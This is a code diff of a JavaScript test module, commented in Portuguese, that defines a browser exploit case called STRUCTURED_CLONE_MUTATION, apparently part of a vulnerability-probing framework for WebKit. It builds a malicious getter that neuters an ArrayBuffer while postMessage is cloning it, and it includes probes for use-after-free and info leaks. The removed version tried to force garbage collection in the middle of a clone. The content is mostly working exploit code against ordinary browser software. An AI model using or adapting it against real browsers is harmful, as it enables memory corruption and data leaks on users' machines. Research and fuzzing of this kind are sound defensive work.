@@ -1,54 +1,72 @@
-import { GCOracle } from '../mod_executor.js';
-
 export default {
     id:       'STRUCTURED_CLONE_MUTATION',
     category: 'Concurrency',
     risk:     'CRITICAL',
     description:
-        'Ataca o SerializedScriptValue (Structured Clone) via getter malicioso. ' +
-        'O Array é destruído e o GC é forçado sincronamente ENQUANTO o C++ o copia.',
+        'Ataca o SerializedScriptValue transferindo a ownership de um ArrayBuffer ' +
+        'durante a clonagem estrutural de um getter. O C++ calcula o tamanho da memória, ' +
+        'o getter arranca a memória original via transferência neutering, e o C++ retoma a cópia a ler o vazio.',
 
-setup: function() {
-        this.vulnArray = [1.1, 2.2, 3.3, 4.4];
+    setup: function() {
+        this.results = {};
         this.channel = new MessageChannel();
+        this.buffer = new ArrayBuffer(1024);
         
-        const self = this; // O SEGREDO: Salva a referência do cenário!
-        
+        // Escrevemos algo para validar se o buffer sobrevive
+        new Uint32Array(this.buffer)[0] = 0xBADF00D;
+
+        const self = this;
+
+        // O Payload Malicioso
         this.evilPayload = {
             a: 1,
-            b: 2,
-            get c() {
-                // Mutação síncrona usando a referência correta
-                self.vulnArray.length = 0;
-                
-                // Forçamos limpeza imediata do IsoHeap com arrays gigantes
-                let trash = [];
-                for(let i=0; i<15; i++) trash.push(new Float64Array(1024 * 512));
-                return 3;
-            }
+            get b() {
+                try {
+                    // O GATILHO: O C++ está no meio da clonagem.
+                    // Nós usamos um segundo postMessage sincrono para transferir
+                    // (neuter) o buffer e arrancar a sua memória física.
+                    self.channel.port1.postMessage("transfer", [self.buffer]);
+                } catch(e) {}
+                return 2;
+            },
+            // O C++ vai tentar ler 'c' logo após 'b' ter destruído a memória!
+            c: this.buffer
         };
-        this.evilPayload.d = this.vulnArray; 
-
-        // 🚨 Oráculo: Vamos vigiar se o array C++ morre
-        if (GCOracle.registry) GCOracle.registry.register(this.vulnArray, `${this.id}_array`);
     },
 
     trigger: function() {
         try {
-            // O WebKit itera as chaves e, ao bater no getter 'c', o array 'd' é corrompido
+            // Inicia o processo fatal de clonagem C++
             this.channel.port1.postMessage(this.evilPayload);
-        } catch(e) {}
+        } catch(e) {
+            this.results.error = e.constructor.name;
+        }
     },
 
     probe: [
-        s => s.vulnArray.length,
-        s => s.vulnArray[0],
-        s => s.vulnArray[3],
-        s => typeof s.vulnArray[0]
+        // Probe 0: O buffer foi efetivamente transferido e castrado (neutered)?
+        s => s.buffer.byteLength,
+        
+        // Probe 1: O C++ crashou internamente na clonagem ou devolveu erro ao JS?
+        s => s.results.error || 'Nenhum erro JS lançado. Verificando memória...',
+        
+        // Probe 2: Lemos o ArrayBuffer original. Se o byteLength for 0, mas conseguirmos
+        // ler dados, temos um UAF brutal do objeto nativo.
+        s => {
+            try {
+                if (s.buffer.byteLength === 0) {
+                    let view = new Uint32Array(s.buffer);
+                    if (view[0]) return `💥 INFO LEAK: 0x${view[0].toString(16)}`;
+                }
+                return 'Protegido (Acesso Negado ao Buffer Castrado)';
+            } catch(e) {
+                return 'Seguro (TypeError esperado)';
+            }
+        }
     ],
 
     cleanup: function() {
-        this.vulnArray = null;
+        this.buffer = null;
         this.evilPayload = null;
         try { this.channel.port1.close(); } catch(e){}
     }
